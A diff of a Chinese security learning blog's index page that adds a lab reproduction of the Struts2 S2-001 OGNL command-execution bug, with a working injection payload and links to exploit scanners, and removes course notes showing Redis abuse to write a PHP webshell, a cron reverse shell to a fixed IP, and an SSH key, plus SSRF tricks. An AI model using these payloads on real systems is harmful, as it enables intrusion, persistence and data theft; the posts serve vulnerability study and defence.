@@ -69,6 +69,61 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-s2-001OGNL命令执行" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/01/25/s2-001OGNL%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="article-date">
+  <time class="dt-published" datetime="2025-01-24T16:49:26.000Z" itemprop="datePublished">2025-01-25</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/01/25/s2-001OGNL%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-001OGNL命令执行</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2><span id="概述">概述</span></h2><h3><span id="产生原因">产生原因</span></h3><p>该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 <code>%&#123;value&#125;</code> 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+<h3><span id="影响">影响</span></h3><p>参考链接1</p>
+<h2><span id="环境搭建">环境搭建</span></h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cd struts2/s2-001</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h2><span id="复现">复现</span></h2><p>抓取登陆包</p>
+<p>构造执行<code>ls -a</code>的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password=%25&#123;%23a%3d(new+java.lang.ProcessBuilder(new+java.lang.String[]&#123;&quot;ls&quot;,&quot;-a&quot;&#125;)).redirectErrorStream(true).start(),%23b%3d%23a.getInputStream(),%23c%3dnew+java.io.InputStreamReader(%23b),%23d%3dnew+java.io.BufferedReader(%23c),%23e%3dnew+char[50000],%23d.read(%23e),%23f%3d%23context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),%23f.getWriter().println(new+java.lang.String(%23e)),%23f.getWriter().flush(),%23f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../assets/image_1737737297331_0.png" alt="image.png"></p>
+<h2><span id="攻防">攻防</span></h2><h3><span id="利用">利用</span></h3><p><a target="_blank" rel="noopener" href="https://github.com/xfiftyone/STS2G">GitHub xfiftyone&#x2F;STS2G: Struts2漏洞扫描利用工具 Golang版. Struts2 Scanner Written in Golang</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/HatBoy/Struts2-Scan">GitHub HatBoy&#x2F;Struts2-Scan: Struts2全漏洞扫描利用工具</a></p>
+<h3><span id="防御">防御</span></h3><p>升级Struts到2.0.9或升级XWork到2.0.4</p>
+<h2><span id="参考">参考</span></h2><p><a target="_blank" rel="noopener" href="https://cwiki.apache.org/confluence/display/WW/S2-001">S2-001 Apache Struts 2 Wiki Apache Software Foundation</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/25/s2-001OGNL%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="cm6z08oqv0029y1iw0xgngnqf" data-title="s2-001OGNL命令执行" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-终端程序走burp代理" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/01/23/%E7%BB%88%E7%AB%AF%E7%A8%8B%E5%BA%8F%E8%B5%B0burp%E4%BB%A3%E7%90%86/" class="article-date">
@@ -776,74 +831,6 @@
 
 
   
-    <article id="post-day34_kls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/12/26/day34_kls/" class="article-date">
-  <time class="dt-published" datetime="2024-12-26T15:05:22.000Z" itemprop="datePublished">2024-12-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/12/26/day34_kls/">day34_kls</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2><span id="课程内容">课程内容</span></h2><h3><span id="redis">redis</span></h3><p>写webshell</p>
-<p>利用持久化存储写webshell<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  -p</span><br><span class="line">CONFIG SET dir /var/www/html</span><br><span class="line">CONFIG SET dbfilename shell.php</span><br><span class="line">SET test &quot;&lt;!--?php system($_GET[&#x27;cmd&#x27;]); ?--&gt;&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure></p>
-<p>写计划任务</p>
-<p>利用条件</p>
-<p>目标机器为centos系列</p>
-<p>cetnos系列cron会略过错误的行</p>
-<p>原理与写webshell相同<br>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  -p</span><br><span class="line">CONFIG SET dir /var/spool/cron/</span><br><span class="line">CONFIG SET dbfilename root</span><br><span class="line">set test &quot;\n\n\n * * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.2.183/9999 0&gt;&amp;1  \n\n\n&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure></p>
-<p>写ssh public key</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  -p</span><br><span class="line">CONFIG SET dir /root/.ssh/</span><br><span class="line">CONFIG SET dbfilename authorized_keys</span><br><span class="line">set test &quot;\n\n\n your_key\n\n&quot;</span><br><span class="line">SAVE</span><br></pre></td></tr></table></figure>
-
-<h3><span id="ssrf">ssrf</span></h3><h4><span id="原因">原因</span></h4><p>开发者未对用户可控的url进行限制，导致服务器请求到恶意的url</p>
-<h4><span id="危害">危害</span></h4><p>内网探测</p>
-<p>信息泄漏</p>
-<h4><span id="挖掘">挖掘</span></h4><p>白盒</p>
-<p>是否存在用户可控的服务器访问url</p>
-<p>黑盒</p>
-<p>参数中存在url就可劲干</p>
-<p>验证是否存在漏洞</p>
-<p>http</p>
-<p>dnslog</p>
-<h4><span id="利用">利用</span></h4><p>文件读取</p>
-<p><code>file:///path/to/file</code></p>
-<p>端口探测</p>
-<p><code>dict://host:ip</code></p>
-<h4><span id="防御">防御</span></h4><p>过滤恶意协议</p>
-<p>禁止访问内网ip</p>
-<h4><span id="绕过防御">绕过防御</span></h4><p>对于127.0.0.1</p>
-<p>使用127.1.1.1等类似ip绕过</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2024/12/26/day34_kls/" data-id="cm6z08oqq001my1iwf2z0cpya" data-title="day34_kls" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kls/" rel="tag">kls</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -888,7 +875,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/03/">March 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/02/">February 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li></ul>
     </div>
   </div>
 
@@ -899,6 +886,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2025/03/01/weekn_kls_exam/">weekn_kls_exam</a>
+          </li>
         
           <li>
             <a href="/2025/02/11/linux%E4%B8%8B%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/">linux下微信小程序抓包</a>
@@ -914,10 +905,6 @@
         
           <li>
             <a href="/2025/01/28/s2-013%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-013命令执行</a>
-          </li>
-        
-          <li>
-            <a href="/2025/01/26/s2-009%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">s2-009命令执行</a>
           </li>
         
       </ul>
